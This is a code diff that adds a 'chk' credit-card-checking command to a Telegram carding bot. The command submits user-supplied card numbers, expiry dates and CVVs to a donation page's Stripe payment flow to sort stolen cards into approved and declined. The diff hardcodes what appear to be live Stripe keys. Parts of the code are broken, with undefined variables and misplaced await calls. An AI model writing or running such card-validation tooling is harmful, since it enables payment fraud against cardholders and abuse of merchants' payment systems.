@@ -6,6 +6,8 @@ from Checks.Altbalaji import altbalaji_helper
 from Miscellaneous.Scraper import pastebin, text_scraper, throwbin, ghostbin
 import os
 import requests
+import random
+import string
 import json
 import math
 from collections import OrderedDict
@@ -34,11 +36,8 @@ def start(update, context):
     return
 
     
-
-#def combos_spilt(combos):
- ##   split = combos.split('\n')
-#return split
-
+####################################################################################################################################3
+# help botstart botcmds botinfo bin
 
 def help(update, context):
     chat_id = update.message.chat_id
@@ -113,7 +112,113 @@ def bin(update, context):
         p = "Not Valid Bin!{} \n ━━━━━━━━━━━━━━━  \n • Bin: {} \n 👤 Checked By: @ASURCCWORLDBOT\n Used By @{}"
         text = p.format(wdia,ab[:6],userid)
         Sendmessage(chat_id, text)
+################################################################################################################################33
+def chk(update,context):
+    chat_id = update.message.chat_id
+    info = update.effective_user
+    chat_id = info.id
+    userid= info['username']
+    text =  update.message.text.split(' ', 1)
+    maintxt=text[-1]
+    i=maintxt.split("|")
+    cc=i[0]
+    mon=i[1]
+    year=i[2]
+    cvv=i[3]
+    skeys = OrderedDict([(1,'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')]);
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0","Accept": "application/json, text/plain, */*","Content-Type": "application/x-www-form-urlencoded"}
+    s = session.post("https://m.stripe.com/6",headers=headers)
+    r = s.json()
+    Guid = r["guid"]
+    Muid = r["muid"]
+    Sid = r["sid"]
+    payload = {
+      "lang": "en",
+      "type": "donation",
+      "currency": "USD",
+      "amount": "5",
+      "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
+      "currencySign": "$"
+    }
+    
+    head = {
+      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Accept": "*/*",
+      "Origin": "https://adblockplus.org",
+      "Sec-Fetch-Dest": "empty",
+      "Referer": "https://adblockplus.org/",
+      "Accept-Language": "en-US,en;q=0.9"
+    }
+    
+    re = session.post("https://new-integration.adblockplus.org/",
+                     data=payload, headers=head)
+    client = re.text
+    pi = client[0:27]
+    
 
+    load = {
+      "receipt_email": email,
+      "payment_method_data[type]": "card",
+      "payment_method_data[billing_details][email]": "dheeraj",
+      "payment_method_data[card][number]": cc,
+      "payment_method_data[card][cvc]": cvv,
+      "payment_method_data[card][exp_month]": mon,
+      "payment_method_data[card][exp_year]": year,
+      "payment_method_data[guid]": Guid,
+      "payment_method_data[muid]": Muid,
+      "payment_method_data[sid]": Sid,
+      "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
+      "payment_method_data[referrer]": "https://adblockplus.org/",
+      "expected_payment_method_type": "card",
+      "use_stripe_sdk": "true",
+      "webauthn_uvpa_available": "true",
+      "spc_eligible": "false",
+      "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
+      "client_secret": client
+    }
+    
+    header = {
+      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Accept": "application/json",
+      "Origin": "https://js.stripe.com",
+      "Referer": "https://js.stripe.com/",
+      "Accept-Language": "en-US,en;q=0.9"
+    }
+    
+    rx = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
+                     data=load, headers=header)
+    res = rx.json()
+    msg = res["error"]["message"]
+    toc = time.perf_counter()
+    if "incorrect_cvc" in rx.text:
+        await message.reply(f"""
+✅<b>CC</b>➟ <code>{cc}</code>
+<b>STATUS</b>➟ #ApprovedCCN
+<b>MSG</b>➟ {msg}
+<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+""")
+    elif "Unrecognized request URL" in rx.text:
+        await message.reply("[UPDATE] PROXIES ERROR")
+    elif rx.status_code == 200:
+        await message.reply(f"""
+✔️<b>CC</b>➟ <code>{cc}</code>
+<b>STATUS</b>➟ #ApprovedCVV
+<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+""")
+    else:
+        await message.reply(f"""
+❌<b>CC</b>➟ <code>{cc}</code>
+<b>STATUS</b>➟ Declined
+<b>MSG</b>➟ {msg}
+<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+""")
+    
+#########################################################################################################
 	
 def scraperdfnc(update, context):
     msg = update.message.text
@@ -144,6 +249,7 @@ def main():
     dp.add_handler(CommandHandler("help", help))
     dp.add_handler(CommandHandler("botinfo", botinfo))
     dp.add_handler(CommandHandler("botcmds", botcmds))
+    dp.add_handler(CommandHandler("chk", chk))
     dp.add_handler(CommandHandler("bin", bin))
     dp.add_handler(CommandHandler("botstart", botstart))
     logger.info("Bot Started!!!")
